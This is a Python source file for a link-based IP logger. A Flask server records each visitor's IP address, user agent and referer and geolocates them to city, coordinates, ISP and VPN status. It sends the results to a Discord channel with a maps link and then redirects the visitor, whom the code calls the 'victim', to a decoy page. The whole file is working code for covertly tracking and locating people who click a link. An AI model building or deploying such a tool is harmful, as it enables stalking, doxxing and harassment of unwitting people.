import os
import requests
import socket
import struct
from datetime import datetime
from flask import Flask, request, redirect
import discord
from discord import Embed, Color
import asyncio
import threading

# ─── CONFIG ────────────────────────────────────────────────
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", "0"))
REDIRECT_URL = os.getenv("REDIRECT_URL", "https://www.google.com")
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN", "")  # optional, for ipinfo.io
# ──────────────────────────────────────────────────────────

app = Flask(__name__)

# Discord bot setup
intents = discord.Intents.default()
bot = discord.Bot(intents=intents)  # uses py-cord

# Global queue for sending messages from Flask to Discord
message_queue = asyncio.Queue()

# ─── IP LOOKUP ────────────────────────────────────────────

def get_ip_info(ip):
    """Try ip-api.com (free, no key), fallback to ipinfo.io"""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                return {
                    "ip": ip,
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "org": data.get("org", "Unknown"),
                    "lat": data.get("lat"),
                    "lon": data.get("lon"),
                    "timezone": data.get("timezone", "Unknown"),
                    "mobile": data.get("mobile", False),
                    "proxy": data.get("proxy", False),
                    "hosting": data.get("hosting", False),
                }
    except:
        pass

    # Fallback to ipinfo.io if token provided
    if IPINFO_TOKEN:
        try:
            r = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                loc = data.get("loc", "").split(",")
                return {
                    "ip": ip,
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("region", "Unknown"),
                    "isp": data.get("org", "Unknown"),
                    "org": data.get("org", "Unknown"),
                    "lat": float(loc[0]) if len(loc) == 2 else None,
                    "lon": float(loc[1]) if len(loc) == 2 else None,
                    "timezone": data.get("timezone", "Unknown"),
                    "proxy": data.get("privacy", {}).get("proxy", False) if "privacy" in data else False,
                }
        except:
            pass

    return {"ip": ip, "country": "Unknown", "city": "Unknown"}

# ─── CREATE EMBED ──────────────────────────────────────────

def build_embed(ip_info, ua, referer, timestamp):
    """Build a rich Discord embed from IP data"""
    color = Color.red()
    if ip_info.get("proxy") or ip_info.get("hosting"):
        color = Color.orange()
    if ip_info.get("mobile"):
        color = Color.blue()

    embed = Embed(
        title="📍 IP Captured",
        color=color,
        timestamp=timestamp
    )

    embed.add_field(name="IP Address", value=f"`{ip_info['ip']}`", inline=False)

    location_parts = []
    if ip_info.get("city") and ip_info["city"] != "Unknown":
        location_parts.append(ip_info["city"])
    if ip_info.get("region") and ip_info["region"] != "Unknown":
        location_parts.append(ip_info["region"])
    if ip_info.get("country") and ip_info["country"] != "Unknown":
        location_parts.append(ip_info["country"])

    location_str = ", ".join(location_parts) if location_parts else "Unknown"
    embed.add_field(name="📍 Location", value=location_str, inline=True)

    if ip_info.get("lat") and ip_info.get("lon"):
        maps_link = f"https://www.google.com/maps?q={ip_info['lat']},{ip_info['lon']}"
        embed.add_field(name="🗺️ Maps", value=f"[Open Maps]({maps_link})", inline=True)
        if ip_info.get("lat") and ip_info.get("lon"):
            embed.set_footer(text=f"{ip_info['lat']}, {ip_info['lon']}")

    embed.add_field(name="🏢 ISP", value=ip_info.get("isp", "Unknown"), inline=True)
    embed.add_field(name="🏛️ Organization", value=ip_info.get("org", "Unknown"), inline=True)
    embed.add_field(name="🕐 Timezone", value=ip_info.get("timezone", "Unknown"), inline=True)

    # Flags
    flags = []
    if ip_info.get("proxy"):
        flags.append("🚫 Proxy/VPN")
    if ip_info.get("hosting"):
        flags.append("☁️ Hosting/Datacenter")
    if ip_info.get("mobile"):
        flags.append("📱 Mobile")
    if flags:
        embed.add_field(name="⚠️ Flags", value=" | ".join(flags), inline=False)

    embed.add_field(name="🌐 User-Agent", value=f"`{ua[:100]}`" if ua else "`Unknown`", inline=False)
    if referer:
        embed.add_field(name="🔗 Referer", value=f"`{referer[:100]}`", inline=False)

    return embed

# ─── FLASK ROUTES ──────────────────────────────────────────

@app.route("/")
def index():
    # Get real IP
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    ua = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "")
    timestamp = datetime.utcnow()

    # Lookup IP info
    ip_info = get_ip_info(ip)

    # Build embed
    embed = build_embed(ip_info, ua, referer, timestamp)

    # Queue for Discord bot to send
    asyncio.run_coroutine_threadsafe(
        message_queue.put(embed),
        bot.loop
    )

    # Redirect victim
    return redirect(REDIRECT_URL)

@app.route("/ping")
def ping():
    """Health check"""
    return "pong", 200

# ─── DISCORD BOT ───────────────────────────────────────────

@bot.event
async def on_ready():
    print(f"[+] Bot logged in as {bot.user}")
    channel = bot.get_channel(DISCORD_CHANNEL_ID)
    if channel:
        await channel.send("🟢 **IP Logger is online and ready**")
    # Start the message processor
    bot.loop.create_task(process_queue())

async def process_queue():
    """Continuously consume the message queue and send to Discord"""
    await bot.wait_until_ready()
    channel = bot.get_channel(DISCORD_CHANNEL_ID)
    if not channel:
        print(f"[!] Channel {DISCORD_CHANNEL_ID} not found")
        return

    while True:
        try:
            embed = await message_queue.get()
            await channel.send(embed=embed)
        except Exception as e:
            print(f"[!] Queue error: {e}")
        await asyncio.sleep(0.5)  # Rate limit safety

@bot.slash_command(name="status", description="Check bot status and stats")
async def status(ctx):
    await ctx.respond(
        embed=Embed(
            title="Bot Status",
            description=f"✅ Online\n📊 Queue size: {message_queue.qsize()}",
            color=Color.green()
        ),
        ephemeral=True
    )

@bot.slash_command(name="setredirect", description="Change the redirect URL")
async def set_redirect(ctx, url: str):
    global REDIRECT_URL
    REDIRECT_URL = url
    await ctx.respond(f"✅ Redirect URL set to: {url}", ephemeral=True)

# ─── RUN BOTH ──────────────────────────────────────────────

def run_flask():
    port = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

def run_bot():
    if not DISCORD_BOT_TOKEN:
        print("[!] DISCORD_BOT_TOKEN not set!")
        return
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    import threading
    t = threading.Thread(target=run_flask, daemon=True)
    t.start()
    run_bot()
